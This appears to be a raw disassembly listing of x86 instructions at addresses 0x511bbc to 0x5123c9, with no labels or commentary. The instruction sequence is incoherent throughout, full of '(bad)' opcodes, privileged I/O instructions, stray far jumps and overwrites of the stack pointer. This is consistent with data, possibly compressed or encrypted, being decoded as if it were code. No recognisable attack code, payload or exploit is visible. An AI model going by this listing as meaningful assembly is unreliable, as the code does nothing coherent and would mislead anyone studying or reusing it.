  511bbc:	imul   edx,DWORD PTR [edx-0x2de15382],0xafdcaf50
  511bc6:	loopne 0x511c07
  511bc8:	pop    esi
  511bc9:	lahf   
  511bca:	das    
  511bcb:	sar    BYTE PTR [ebp-0x2a0da7ac],cl
  511bd1:	mov    bl,0xfb
  511bd3:	inc    edi
  511bd4:	inc    ebp
  511bd5:	icebp  
  511bd6:	and    DWORD PTR [edi-0x2e31859c],esp
  511bdc:	jbe    0x511b9f
  511bde:	cli    
  511bdf:	xchg   esp,eax
  511be0:	or     ch,BYTE PTR ds:0xddd2691
  511be6:	inc    ebx
  511be7:	mov    eax,ds:0x1292379a
  511bec:	test   eax,0xa3e45acb
  511bf1:	sub    BYTE PTR [esi-0x3e],0x67
  511bf5:	and    ebp,DWORD PTR [edx-0x22eb0233]
  511bfb:	push   es
  511bfc:	mov    bl,0xfd
  511bfe:	repz jg 0x511bb6
  511c01:	ins    BYTE PTR es:[edi],dx
  511c02:	shr    DWORD PTR [edi+0x50],cl
  511c05:	mov    esp,0x94674f7e
  511c0a:	mov    esp,0x6b5b5f3b
  511c0f:	and    DWORD PTR [ebx],0x69
  511c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  511c13:	add    DWORD PTR [ebp+0x16],eax
  511c16:	out    0x72,eax
  511c18:	add    bh,BYTE PTR [ebp-0x73]
  511c1b:	ror    BYTE PTR [esi+eax*2+0x76cf3052],cl
  511c22:	es leave 
  511c24:	mov    ah,0x7c
  511c26:	enter  0xef95,0x71
  511c2a:	ja     0x511c27
  511c2c:	icebp  
  511c2d:	cli    
  511c2e:	pusha  
  511c2f:	lea    ecx,[edi+0x726a4b23]
  511c35:	xchg   DWORD PTR [esi-0x4c],esi
  511c38:	jnp    0x511bde
  511c3a:	cmp    BYTE PTR [esp+eax*2],dl
  511c3d:	dec    eax
  511c3e:	sub    DWORD PTR [ecx+0x2a],0x35af722e
  511c45:	bts    DWORD PTR [edi],ebx
  511c48:	cmp    dh,BYTE PTR [ecx+0x36]
  511c4b:	xor    al,0xd
  511c4d:	pop    esp
  511c4e:	mov    ebx,0x2a0a40bd
  511c53:	jge    0x511c5c
  511c55:	adc    eax,0xcf16a5a7
  511c5a:	xor    eax,0xf55617ac
  511c5f:	cmp    edx,DWORD PTR [edi+0x64]
  511c62:	push   edi
  511c63:	aad    0x8d
  511c65:	hlt    
  511c66:	les    ebp,FWORD PTR [eax]
  511c68:	shr    BYTE PTR [ecx-0xdfb331d],cl
  511c6e:	xchg   DWORD PTR [ecx-0x3a],eax
  511c71:	push   cs
  511c72:	clc    
  511c73:	rcl    BYTE PTR [ebp+0x579dd315],1
  511c79:	(bad)  
  511c7a:	adc    eax,0x561f3580
  511c7f:	lock adc dl,al
  511c82:	pushf  
  511c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511c84:	addr16 cwde 
  511c86:	addr16 lock sahf 
  511c89:	test   dl,bh
  511c8b:	xor    al,0x39
  511c8d:	aad    0x65
  511c8f:	or     ebp,DWORD PTR [ebx-0x23687b80]
  511c95:	and    eax,0xa4602af0
  511c9a:	test   DWORD PTR [edx-0x119d897c],0xeee03d75
  511ca4:	and    DWORD PTR [ebx+0x59],ebx
  511ca7:	int    0xdb
  511ca9:	cmp    DWORD PTR [ebx-0x7f],eax
  511cac:	mov    edx,0xfec7715f
  511cb1:	inc    esi
  511cb2:	push   edi
  511cb3:	arpl   WORD PTR [eax+0x2fd9a80d],dx
  511cb9:	cs aam 0x81
  511cbc:	(bad)  
  511cbd:	jg     0x511d0b
  511cbf:	fld    TBYTE PTR [edx+0x6feb9615]
  511cc5:	sub    al,0xf9
  511cc7:	(bad)  
  511cc9:	mov    edx,0xdab11b06
  511cce:	adc    bh,BYTE PTR ds:0x6344582c
  511cd4:	and    eax,0x51b3b893
  511cd9:	inc    esp
  511cda:	lods   eax,DWORD PTR ds:[esi]
  511cdb:	cmc    
  511cdc:	dec    eax
  511cdd:	out    0x28,al
  511cdf:	mov    WORD PTR [ebp-0x4e8409ea],ds
  511ce5:	push   esi
  511ce6:	(bad)  [edi-0x5b]
  511ce9:	adc    BYTE PTR [edi-0x6c],bl
  511cec:	add    eax,DWORD PTR [ebp+0x5e]
  511cef:	jb     0x511c7a
  511cf1:	mov    al,0x94
  511cf3:	gs mov ebp,0xa802330c
  511cf9:	out    0x9e,eax
  511cfb:	adc    eax,0x41d9cb35
  511d00:	imul   edi,esi,0xd2ad4a37
  511d06:	add    al,0x77
  511d08:	mov    edx,0xe7637402
  511d0d:	gs aam 0x32
  511d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511d11:	sahf   
  511d12:	nop
  511d13:	push   eax
  511d14:	pop    esp
  511d15:	addr16 jns 0x511d2a
  511d18:	push   ss
  511d19:	cdq    
  511d1a:	outs   dx,BYTE PTR ds:[esi]
  511d1b:	inc    ebx
  511d1c:	test   BYTE PTR [esi-0x7b],0x55
  511d20:	and    ah,dh
  511d22:	jl     0x511d66
  511d24:	sub    BYTE PTR [eax-0x62c52c63],dl
  511d2a:	fimul  WORD PTR [ecx-0x584e9040]
  511d30:	xor    edi,DWORD PTR [edi-0x8b1e279]
  511d36:	cld    
  511d37:	xchg   esp,eax
  511d38:	and    DWORD PTR [ecx+0x7a751674],ebp
  511d3e:	pop    ebp
  511d3f:	dec    edi
  511d40:	icebp  
  511d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511d42:	cmp    DWORD PTR [esi+0x12daa614],esp
  511d48:	xor    ch,BYTE PTR [edi-0x242411b4]
  511d4e:	sbb    ah,BYTE PTR [ebp-0x66e036d4]
  511d54:	je     0x511db0
  511d56:	bound  edi,QWORD PTR [esi+0x7723e9ac]
  511d5c:	jl     0x511cff
  511d5e:	push   edx
  511d5f:	push   esi
  511d60:	push   cs
  511d61:	and    DWORD PTR [edx-0xe],ebx
  511d64:	mov    bh,0xa5
  511d66:	pushf  
  511d67:	test   DWORD PTR [edx],0x3cad2b14
  511d6d:	int3   
  511d6e:	lea    eax,[eax-0x1e35373f]
  511d74:	or     al,0x35
  511d76:	ret    0xfdd9
  511d79:	es push cs
  511d7b:	xor    esi,edi
  511d7d:	push   esp
  511d7e:	shl    BYTE PTR [esi+0x3f],1
  511d81:	cmp    ch,dl
  511d83:	xor    bh,BYTE PTR [ebp-0x357b4457]
  511d89:	aaa    
  511d8a:	dec    ebx
  511d8b:	push   edx
  511d8c:	int    0x6d
  511d8e:	popa   
  511d8f:	xchg   edx,eax
  511d90:	mov    BYTE PTR [edi+0x7d8675a1],al
  511d96:	mov    eax,0x7e004efd
  511d9b:	add    DWORD PTR [ebx-0x79e3dc9d],0xb02f01
  511da5:	push   esp
  511da6:	xchg   esi,eax
  511da7:	(bad)  
  511da8:	or     eax,0x8b9f2e52
  511dad:	inc    edi
  511dae:	jns    0x511da8
  511db0:	xchg   DWORD PTR [eax+0x6a],ecx
  511db3:	std    
  511db4:	repz jl 0x511d5d
  511db7:	lds    ebx,FWORD PTR [edi-0x2a40cb8f]
  511dbd:	mov    ah,0x43
  511dbf:	pushf  
  511dc0:	mov    al,0xff
  511dc2:	dec    eax
  511dc3:	not    dl
  511dc5:	mov    ebx,0x8795bfd9
  511dca:	inc    edi
  511dcb:	jb     0x511dbf
  511dcd:	jne    0x511e32
  511dcf:	xchg   DWORD PTR [edx+0xd],ecx
  511dd2:	push   esp
  511dd3:	int    0xd6
  511dd5:	sar    DWORD PTR [ebx],cl
  511dd7:	dec    ecx
  511dd8:	cmp    eax,0x66a063d5
  511ddd:	outs   dx,DWORD PTR ds:[esi]
  511dde:	cmc    
  511ddf:	cs dec esp
  511de1:	add    al,0x68
  511de3:	dec    ebx
  511de4:	jb     0x511d96
  511de6:	sbb    DWORD PTR ss:[bx+di+0x315b],0xffffff82
  511ded:	jno    0x511dd8
  511def:	test   eax,0xa65429cc
  511df4:	js     0x511e6c
  511df6:	mov    eax,0x1ea6d8
  511dfb:	mov    ecx,0xf591dc82
  511e00:	jmp    0x537b:0x8097a55f
  511e07:	lds    eax,FWORD PTR [esi+0x649c756b]
  511e0d:	ret    
  511e0e:	and    ch,BYTE PTR [edi]
  511e10:	and    BYTE PTR [edi+eiz*8-0x4372fd8d],al
  511e17:	iret   
  511e18:	int3   
  511e19:	pusha  
  511e1a:	push   cs
  511e1b:	ss jmp 0x9119:0x42077e3e
  511e23:	mov    eax,ds:0x8bb6fdea
  511e28:	les    di,DWORD PTR [ecx]
  511e2b:	stc    
  511e2c:	mov    ds:0x74677806,eax
  511e31:	int3   
  511e32:	mov    ecx,0xc7319d57
  511e37:	jmp    0x29beb15a
  511e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511e3d:	retf   0x9368
  511e40:	push   ebx
  511e41:	jbe    0x511e07
  511e43:	inc    ebx
  511e44:	daa    
  511e45:	or     edi,DWORD PTR [ebx+0x20]
  511e48:	rcr    dh,1
  511e4a:	mov    edi,0x53788338
  511e4f:	inc    esi
  511e50:	retf   
  511e51:	push   ebp
  511e52:	into   
  511e53:	clc    
  511e54:	inc    edi
  511e55:	loope  0x511eaa
  511e57:	int3   
  511e58:	xchg   esp,eax
  511e59:	mov    al,0xcc
  511e5b:	call   0x6332e4e4
  511e60:	out    0x3e,eax
  511e62:	mul    DWORD PTR [ebx]
  511e64:	and    BYTE PTR [ebp-0x481c6520],bl
  511e6a:	add    eax,esp
  511e6c:	pusha  
  511e6d:	add    ch,BYTE PTR ds:0xf475579e
  511e73:	push   eax
  511e74:	add    ebx,DWORD PTR ds:0xb4f78fa4
  511e7a:	clc    
  511e7b:	push   cs
  511e7c:	imul   eax,DWORD PTR [ebx],0x6a
  511e7f:	xor    esi,eax
  511e81:	pop    ecx
  511e82:	call   0xdd63:0xec78595e
  511e89:	sahf   
  511e8a:	jbe    0x511eff
  511e8c:	lea    esp,ds:0x9199267a
  511e92:	sbb    DWORD PTR [eax-0x2c5d298b],ecx
  511e98:	rcr    dh,cl
  511e9a:	outs   dx,BYTE PTR ds:[esi]
  511e9b:	sub    dh,BYTE PTR [eax+0x5d]
  511e9e:	or     BYTE PTR [esp+esi*4+0x60],bl
  511ea2:	jge    0x511e56
  511ea4:	aam    0x5e
  511ea6:	adc    eax,DWORD PTR [ecx-0x1]
  511ea9:	(bad)  
  511eaa:	in     eax,0x53
  511eac:	nop
  511ead:	(bad)  
  511eae:	dec    eax
  511eaf:	(bad)
  511eb4:	lds    edx,FWORD PTR [edi-0xac12c56]
  511eba:	mov    ?,WORD PTR [edi+eiz*2-0x37]
  511ebe:	dec    ebx
  511ebf:	and    ebx,DWORD PTR [ebp-0x41]
  511ec2:	(bad)  
  511ec3:	xchg   ecx,eax
  511ec4:	mov    ch,BYTE PTR [ecx]
  511ec6:	repnz in eax,0x78
  511ec9:	xor    al,0x25
  511ecb:	out    dx,al
  511ecc:	mov    eax,ds:0x1b6e8af4
  511ed1:	scas   al,BYTE PTR es:[edi]
  511ed2:	push   ss
  511ed3:	mov    ebx,0xe432a11c
  511ed8:	xor    BYTE PTR [edx+0x4b],0xe3
  511edc:	cmp    BYTE PTR [esi+0xec0f3b3],dl
  511ee2:	inc    ebp
  511ee4:	cwde   
  511ee5:	pop    ds
  511ee6:	mov    al,ds:0xf3a93da9
  511eeb:	ins    DWORD PTR es:[edi],dx
  511eec:	mov    ah,BYTE PTR [ebx+0x7fce70ff]
  511ef2:	adc    cl,dh
  511ef4:	or     esp,DWORD PTR [edi]
  511ef6:	test   esp,edi
  511ef8:	mov    dh,0x19
  511efa:	jno    0x511ea5
  511efc:	jne    0x511ef3
  511efe:	ret    
  511eff:	add    esp,DWORD PTR [ebp-0x52d7a8e3]
  511f05:	sbb    al,BYTE PTR [edi-0x16]
  511f08:	push   ss
  511f09:	adc    al,0x2e
  511f0b:	mov    dh,0xdc
  511f0d:	call   0xf1a5:0xa8da0526
  511f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511f15:	lock pop ecx
  511f17:	into   
  511f18:	mov    edx,0x74bb9549
  511f1d:	jnp    0x511ea4
  511f1f:	add    DWORD PTR [esi*1+0x1530d960],edx
  511f26:	adc    edi,DWORD PTR [edi-0x77335d42]
  511f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  511f2d:	or     DWORD PTR [edx-0x15f0b86e],esp
  511f33:	mov    DWORD PTR [edx-0x12],ebx
  511f36:	test   BYTE PTR [eax-0x2a],0x36
  511f3a:	cmp    BYTE PTR [ebp-0x5e],bl
  511f3d:	into   
  511f3e:	xchg   DWORD PTR [edi+0x3a],esi
  511f41:	jb     0x511f6a
  511f43:	or     DWORD PTR [edx+0x58],edi
  511f46:	in     al,dx
  511f47:	popa   
  511f48:	jge    0x511fbf
  511f4a:	add    ebp,DWORD PTR [ecx-0x31927d0f]
  511f50:	and    DWORD PTR [ecx-0x7d],eax
  511f53:	mov    cl,0xf3
  511f55:	pop    edi
  511f56:	push   eax
  511f57:	mov    esi,0x7f6b7a7c
  511f5c:	push   esi
  511f5d:	or     eax,0x38fffd62
  511f62:	sub    al,0x39
  511f64:	sbb    dl,bh
  511f66:	scas   al,BYTE PTR es:[edi]
  511f67:	psubusw mm0,QWORD PTR [ebx]
  511f6a:	jb     0x511f9a
  511f6c:	push   ebp
  511f6d:	push   cs
  511f6e:	sbb    al,0x53
  511f70:	data16 test BYTE PTR [ecx+esi*4],ch
  511f74:	pop    es
  511f75:	fld    QWORD PTR [edx-0x6edf400c]
  511f7b:	push   cs
  511f7c:	call   0xdcee5836
  511f81:	push   eax
  511f82:	vaddpd ymm0,ymm2,ymm2
  511f86:	and    ebx,edi
  511f88:	cs or  eax,0x84c04c0e
  511f8e:	imul   BYTE PTR [esi]
  511f90:	mov    dh,bh
  511f92:	ror    DWORD PTR [esp+edi*8+0x72],cl
  511f96:	int    0xe9
  511f98:	inc    ebx
  511f99:	leave  
  511f9a:	sub    eax,0x7cff5455
  511f9f:	xchg   ebx,eax
  511fa0:	call   0x50d9:0xfae0d18f
  511fa7:	retf   0xd0f0
  511faa:	pusha  
  511fab:	mov    ds:0x76720903,al
  511fb0:	add    DWORD PTR [esi+0x3],esi
  511fb3:	xchg   edx,eax
  511fb4:	out    dx,al
  511fb5:	les    edi,FWORD PTR [esi]
  511fb7:	xor    ecx,edi
  511fb9:	call   0x1fbe0e16
  511fbe:	icebp  
  511fbf:	sbb    edx,edi
  511fc1:	arpl   WORD PTR [edx],dx
  511fc3:	js     0x512013
  511fc5:	ins    DWORD PTR es:[edi],dx
  511fc6:	xor    esp,DWORD PTR [ebx+0x49aea72c]
  511fcc:	mov    eax,ds:0xa3d1043d
  511fd1:	jns    0x511f86
  511fd3:	sub    edx,DWORD PTR [ecx-0x7cfb797d]
  511fd9:	xchg   DWORD PTR [edx],ebx
  511fdb:	rcr    BYTE PTR [esi-0x3f],0xab
  511fdf:	cmp    al,0xeb
  511fe1:	cs push eax
  511fe3:	mov    bh,0xfb
  511fe5:	lea    ebx,ss:[ebx+0x5f]
  511fe9:	std    
  511fea:	cmp    edi,esi
  511fec:	das    
  511fed:	sbb    al,0xc1
  511fef:	push   edi
  511ff0:	xor    dl,dl
  511ff2:	arpl   WORD PTR ds:0x6558bfe1,cx
  511ff8:	out    0x12,al
  511ffa:	inc    eax
  511ffb:	outs   dx,DWORD PTR ds:[esi]
  511ffc:	fnstenv [edx+edi*8+0x76]
  512000:	stos   DWORD PTR es:[edi],eax
  512001:	and    dh,BYTE PTR [bp+si-0x22bb]
  512006:	les    ebp,FWORD PTR [esi+ecx*4]
  512009:	outs   dx,BYTE PTR ds:[esi]
  51200a:	jg     0x511fd2
  51200c:	adc    dl,BYTE PTR [edx]
  51200e:	dec    edi
  51200f:	sahf   
  512010:	gs jo  0x512089
  512013:	dec    esp
  512014:	add    BYTE PTR [ecx+0x3a1b9a8a],bl
  51201a:	stos   DWORD PTR es:[edi],eax
  51201b:	jb     0x511fa3
  51201d:	cmp    BYTE PTR [esi],al
  51201f:	imul   edx,DWORD PTR gs:[edi+0x5871270e],0x63
  512027:	and    al,0xfb
  512029:	mov    dh,0xca
  51202b:	stc    
  51202c:	mov    dl,0xc4
  51202e:	stc    
  51202f:	out    dx,eax
  512030:	and    esp,ecx
  512032:	pop    ebx
  512033:	mov    cl,al
  512035:	ja     0x511fdd
  512037:	jb     0x512070
  512039:	sbb    DWORD PTR [edi-0x7e],0xecf2c841
  512040:	xor    DWORD PTR [ecx],ecx
  512042:	dec    edx
  512043:	jb     0x512032
  512045:	xchg   esp,eax
  512046:	xchg   edx,eax
  512047:	sub    eax,0xeb85c232
  51204c:	sbb    dl,bh
  51204e:	jb     0x5120c6
  512050:	dec    esp
  512051:	das    
  512052:	arpl   WORD PTR [eax-0x7155c231],dx
  512058:	jle    0x512002
  51205a:	bswap  ecx
  51205c:	cmp    al,0xb9
  51205e:	xchg   edx,eax
  51205f:	xchg   edi,eax
  512060:	nop
  512061:	push   ebx
  512062:	jle    0x512003
  512064:	inc    esp
  512065:	pop    ss
  512066:	dec    eax
  512067:	dec    eax
  512068:	inc    ebx
  512069:	sbb    ebx,DWORD PTR [edx]
  51206b:	xchg   ebx,eax
  51206c:	dec    esi
  51206d:	outs   dx,DWORD PTR ds:[esi]
  51206e:	and    al,ch
  512070:	xor    ecx,edi
  512072:	ins    DWORD PTR es:[edi],dx
  512073:	ret    
  512074:	pop    ss
  512075:	in     al,dx
  512076:	mov    bh,0xdc
  512078:	loope  0x512066
  51207a:	mov    dh,0x4
  51207c:	or     bh,BYTE PTR [edx]
  51207e:	mov    dl,0xc8
  512080:	(bad)  
  512081:	mov    edi,0xf3d26c9a
  512086:	pusha  
  512087:	push   cs
  512088:	imul   BYTE PTR [ebp+0x68]
  51208b:	lea    esp,[ebx+0x15]
  51208e:	shl    ebx,1
  512090:	imul   ebp,DWORD PTR [ebx+edi*8-0x62e4f691],0xde7f5692
  51209b:	push   edx
  51209c:	jo     0x512021
  51209e:	cli    
  51209f:	les    esi,FWORD PTR [ebx]
  5120a1:	pop    edi
  5120a2:	(bad)  
  5120a3:	cmp    esi,edi
  5120a5:	(bad)  
  5120a6:	xchg   esi,eax
  5120a7:	pop    edi
  5120a8:	shl    BYTE PTR [edx-0x514de618],0x9
  5120af:	jge    0x5120ec
  5120b1:	pop    eax
  5120b2:	dec    edi
  5120b3:	in     al,dx
  5120b4:	adc    eax,0x18093f40
  5120b9:	(bad)  
  5120ba:	sub    al,0xf6
  5120bc:	or     ebp,DWORD PTR [edi]
  5120be:	cld    
  5120bf:	mov    ?,WORD PTR [ebx-0x33ab57a]
  5120c5:	cmp    al,0x7f
  5120c7:	jmp    0x512092
  5120c9:	lods   eax,DWORD PTR ds:[esi]
  5120ca:	test   BYTE PTR [edx+0x56c0d3e9],cl
  5120d0:	loopne 0x512077
  5120d2:	sahf   
  5120d3:	mov    dh,0x51
  5120d5:	dec    esi
  5120d6:	jle    0x512077
  5120d8:	sbb    esi,edi
  5120da:	ins    DWORD PTR es:[edi],dx
  5120db:	pop    edx
  5120dc:	sub    dh,BYTE PTR [ebx+0xfa55e4e]
  5120e2:	jge    0x51213b
  5120e4:	xor    eax,0xd828d609
  5120e9:	ins    BYTE PTR es:[edi],dx
  5120ea:	add    edx,DWORD PTR [edi-0x1c]
  5120ed:	daa    
  5120ee:	js     0x51211c
  5120f0:	jle    0x512107
  5120f2:	test   eax,0xaf52f0df
  5120f7:	out    dx,al
  5120f8:	lock jle 0x512175
  5120fb:	inc    edx
  5120fc:	test   al,0x4b
  5120fe:	xchg   ecx,eax
  5120ff:	mov    eax,0x3f4759e0
  512104:	rcl    DWORD PTR ds:0xfcb80757,cl
  51210a:	call   esp
  51210c:	mov    eax,ds:0x94a6dcbc
  512111:	mov    eax,ds:0x8755e82e
  512116:	inc    esi
  512117:	jge    0x512136
  512119:	jne    0x51209c
  51211b:	push   cs
  51211c:	cmp    dh,al
  51211e:	ins    DWORD PTR es:[edi],dx
  51211f:	pop    edx
  512121:	jne    0x5120d0
  512123:	sbb    bl,BYTE PTR [edx+0x3c801dfa]
  512129:	cdq    
  51212a:	call   0x94de:0x1b291912
  512131:	fidiv  WORD PTR [edx]
  512133:	ret    
  512134:	rcr    BYTE PTR [esi-0x12bba400],0x36
  51213b:	or     eax,0xc6192398
  512140:	xchg   ebx,eax
  512141:	loopne 0x5121aa
  512143:	imul   eax,DWORD PTR [eax+0x2eb08384],0xfffffffa
  51214a:	scas   eax,DWORD PTR es:[edi]
  51214b:	mov    bh,0x19
  51214d:	adc    DWORD PTR [edi+eiz*2-0x3da62600],esp
  512154:	lea    ebx,[ebx+0x13]
  512157:	dec    ebx
  512158:	jge    0x512136
  51215a:	and    ah,dh
  51215c:	data16 std 
  51215e:	shr    sp,cl
  512161:	retf   0xf633
  512164:	dec    esp
  512165:	cli    
  512166:	add    al,0x37
  512168:	loop   0x5120fc
  51216a:	and    eax,0x2212ca3
  51216f:	jns    0x512140
  512171:	dec    edx
  512172:	mov    bl,0x91
  512174:	popa   
  512175:	xchg   esi,eax
  512176:	and    ebx,DWORD PTR [ecx]
  512178:	aaa    
  512179:	xor    al,0x92
  51217b:	repz call 0x8333e968
  512181:	sbb    bl,BYTE PTR [ecx+0x7d312e11]
  512187:	pusha  
  512188:	loope  0x51217b
  51218a:	retf   0x2e18
  51218d:	pop    ebp
  51218e:	and    BYTE PTR [esi],dl
  512190:	sbb    dh,cl
  512192:	stos   BYTE PTR es:[edi],al
  512193:	sahf   
  512194:	stos   BYTE PTR es:[edi],al
  512195:	lock out 0x0,eax
  512198:	imul   ecx
  51219a:	(bad)  
  51219b:	in     al,0x89
  51219d:	dec    DWORD PTR [ecx+0x65d22d25]
  5121a3:	out    0x80,al
  5121a5:	and    eax,0x11d204b1
  5121aa:	push   ds
  5121ab:	sub    eax,0x30b02817
  5121b0:	mov    al,0xee
  5121b2:	pop    ds
  5121b3:	imul   edx,esp,0x13a3d320
  5121b9:	fild   QWORD PTR [edi]
  5121bb:	mov    esp,0xd27bafe
  5121c0:	addr16 adc edi,eax
  5121c3:	inc    esp
  5121c4:	pusha  
  5121c5:	arpl   WORD PTR [eax],cx
  5121c7:	aas    
  5121c8:	pusha  
  5121c9:	xlat   BYTE PTR ds:[ebx]
  5121ca:	(bad)  
  5121cb:	sbb    DWORD PTR [esi+ebp*4+0x56],esi
  5121cf:	in     al,0x1e
  5121d1:	(bad)  
  5121d2:	leave  
  5121d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5121d4:	xor    al,0x16
  5121d6:	ret    0x399f
  5121d9:	lahf   
  5121da:	test   eax,0x56810b38
  5121df:	adc    bh,bh
  5121e1:	stos   DWORD PTR es:[edi],eax
  5121e2:	add    edi,DWORD PTR [edi+0x601b6050]
  5121e8:	(bad)  
  5121e9:	jmp    0xfe54:0x700697cd
  5121f0:	lods   al,BYTE PTR ds:[esi]
  5121f1:	and    DWORD PTR [edi],ecx
  5121f3:	and    esp,DWORD PTR [edi-0x51]
  5121f6:	test   BYTE PTR [edi],bh
  5121f8:	out    dx,eax
  5121f9:	icebp  
  5121fa:	les    esi,FWORD PTR [ebp-0x619b7ca]
  512200:	int3   
  512201:	shl    DWORD PTR [ebx],cl
  512203:	js     0x51224b
  512205:	sti    
  512206:	adc    edi,edx
  512208:	pop    edi
  512209:	jns    0x512266
  51220b:	loop   0x512241
  51220d:	add    dl,ch
  51220f:	dec    ebp
  512210:	out    0xdc,al
  512212:	cwde   
  512213:	out    dx,eax
  512214:	scas   al,BYTE PTR es:[edi]
  512215:	repz ja 0x512273
  512218:	mov    esi,DWORD PTR [edi+0x3261728d]
  51221e:	lock cmp esi,esp
  512221:	add    ecx,DWORD PTR ss:[ebx+0x65]
  512225:	std    
  512226:	push   ds
  512227:	sbb    DWORD PTR [ecx-0x62ddffff],esi
  51222d:	mov    ah,al
  51222f:	push   ss
  512230:	add    esi,ebp
  512232:	add    eax,0x327d39bc
  512237:	fstp   QWORD PTR [ebx+0x45c3a83c]
  51223d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51223e:	inc    eax
  51223f:	mov    ebx,0xe4d60350
  512244:	xchg   edi,eax
  512245:	sub    DWORD PTR [edi+0x16fd6f8f],0x18ecabdc
  51224f:	pop    ds
  512250:	inc    edi
  512251:	cmp    eax,0x3d160672
  512256:	mov    eax,0x48b641fc
  51225b:	pop    ss
  51225c:	xchg   edi,eax
  51225d:	push   0x1
  51225f:	pop    ss
  512260:	icebp  
  512261:	push   edx
  512262:	int    0xf
  512264:	mov    al,0x56
  512266:	push   esp
  512267:	cdq    
  512268:	ficom  DWORD PTR [ebx]
  51226a:	sbb    BYTE PTR [ecx],cl
  51226c:	shr    bl,1
  51226e:	cmp    al,0xb
  512270:	cmp    DWORD PTR [ebx+0x19],ebx
  512273:	int    0x7f
  512275:	jle    0x5122b3
  512277:	inc    eax
  512278:	test   ebp,ebx
  51227a:	jl     0x51220d
  51227c:	and    dh,cl
  51227e:	mov    al,dh
  512280:	xchg   edi,eax
  512281:	and    al,0x20
  512283:	add    eax,0xdf152cec
  512288:	fs cmp al,0x5a
  51228b:	ss sahf 
  51228d:	mov    esi,0x2b71c758
  512292:	jmp    0xb0ae957f
  512297:	xchg   ebp,eax
  512298:	aas    
  512299:	nop
  51229a:	xor    ecx,0x7b15fdf6
  5122a0:	rol    DWORD PTR [edi],0x48
  5122a3:	push   cs
  5122a4:	and    BYTE PTR [edi],al
  5122a6:	inc    esi
  5122a7:	and    al,0x87
  5122a9:	mov    ds:0x4dda19cf,eax
  5122ae:	cmp    ecx,DWORD PTR [edx+0x908351e]
  5122b4:	(bad)  
  5122b5:	mov    edx,0xd076297a
  5122ba:	push   0x174cfb7c
  5122bf:	xchg   esp,eax
  5122c0:	jns    0x512249
  5122c2:	ins    DWORD PTR es:[edi],dx
  5122c3:	ss cmp edi,ebp
  5122c6:	jb     0x51228f
  5122c8:	inc    edi
  5122c9:	mov    esi,0x6478865c
  5122ce:	dec    edi
  5122cf:	add    DWORD PTR [ebp+0x8],ebx
  5122d2:	push   esi
  5122d3:	xor    eax,0xa6e41417
  5122d8:	push   0xffffffa0
  5122da:	mov    cl,0x50
  5122dc:	(bad)  
  5122dd:	push   eax
  5122de:	bound  edx,QWORD PTR [ebx-0x67]
  5122e1:	mov    esi,0x773b4537
  5122e6:	ret    
  5122e7:	dec    ecx
  5122e8:	cmc    
  5122e9:	push   esi
  5122ea:	dec    edx
  5122eb:	clc    
  5122ec:	xchg   ebx,eax
  5122ed:	icebp  
  5122ee:	daa    
  5122ef:	push   eax
  5122f0:	loop   0x5122b6
  5122f2:	adc    eax,0x18ea45c3
  5122f7:	retf   0xcc6d
  5122fa:	or     al,0xe9
  5122fc:	jmp    0x512336
  5122fe:	or     eax,0xeb413598
  512303:	mov    WORD PTR [eax-0x51bf7087],es
  512309:	sahf   
  51230a:	or     bh,BYTE PTR [eax+0x38b5ce9b]
  512310:	sub    dh,BYTE PTR [edi+0x727b72b6]
  512316:	cmp    ebx,edx
  512318:	push   ecx
  512319:	loop   0x512356
  51231b:	or     ch,dl
  51231d:	cmp    al,0x9
  51231f:	cmp    BYTE PTR [edx-0x5c49ef52],al
  512325:	addr16 ss push ecx
  512328:	call   0xda9dc225
  51232d:	mov    BYTE PTR [eax-0x5ac9c090],ch
  512333:	stos   DWORD PTR es:[edi],eax
  512334:	jae    0x512370
  512336:	or     BYTE PTR [ebx-0x56],ch
  512339:	(bad)  
  51233a:	xor    cl,bl
  51233c:	push   cs
  51233d:	fcomp  DWORD PTR [edi+0x1f565a6b]
  512343:	aad    0x9
  512345:	dec    eax
  512346:	sbb    BYTE PTR [ecx+0x27],0x42
  51234a:	dec    edi
  51234b:	push   ebx
  51234c:	mov    ebx,DWORD PTR [eax-0x67]
  51234f:	push   ebp
  512350:	mov    al,ds:0x2e250fb7
  512355:	adc    DWORD PTR [ecx+0x44],edx
  512358:	pusha  
  512359:	ret    0x8d6b
  51235c:	lods   al,BYTE PTR ds:[esi]
  51235d:	out    dx,al
  51235e:	xor    bl,ch
  512360:	das    
  512361:	dec    ecx
  512362:	shl    BYTE PTR [ebx],0x65
  512365:	mov    ecx,0x3cc2ecf5
  51236a:	sub    esp,DWORD PTR [edi+esi*2]
  51236d:	popf   
  51236e:	call   0x908aea75
  512373:	fidiv  DWORD PTR [esi]
  512375:	cmp    al,0xc8
  512377:	push   cs
  512378:	mov    DWORD PTR [ecx],0x84b803
  51237e:	adc    ebp,DWORD PTR [edi+0x24]
  512381:	(bad)  
  512382:	xor    al,0x45
  512384:	imul   ecx,DWORD PTR [edi],0x1e
  512387:	test   esp,ebx
  512389:	push   es
  51238a:	or     dh,ch
  51238c:	mov    ah,0x59
  51238e:	bound  eax,QWORD PTR [eax+0x7d]
  512391:	in     eax,0x66
  512393:	dec    edi
  512394:	out    dx,al
  512395:	or     DWORD PTR [ebp+0x4cc0527d],ebx
  51239b:	or     DWORD PTR [ecx-0x50],eax
  51239e:	add    al,0x43
  5123a0:	adc    DWORD PTR [eax],ebx
  5123a2:	mov    dl,0xb2
  5123a4:	icebp  
  5123a5:	jmp    0x1196:0x32a527a0
  5123ac:	sub    ecx,edx
  5123ae:	push   eax
  5123af:	mov    al,0xab
  5123b1:	call   0x952594b
  5123b6:	push   ds
  5123b7:	inc    ecx
  5123b8:	xchg   esi,eax
  5123b9:	pusha  
  5123ba:	cwde   
  5123bb:	xchg   ebx,eax
  5123bc:	pop    esp
  5123bd:	adc    ecx,DWORD PTR [ebp+0x7492a109]
  5123c3:	mov    dh,0x9c
  5123c5:	jo     0x5123b7
  5123c7:	adc    esp,eax
  5123c9:	addr16 mov ecx,0x2a6bfd62
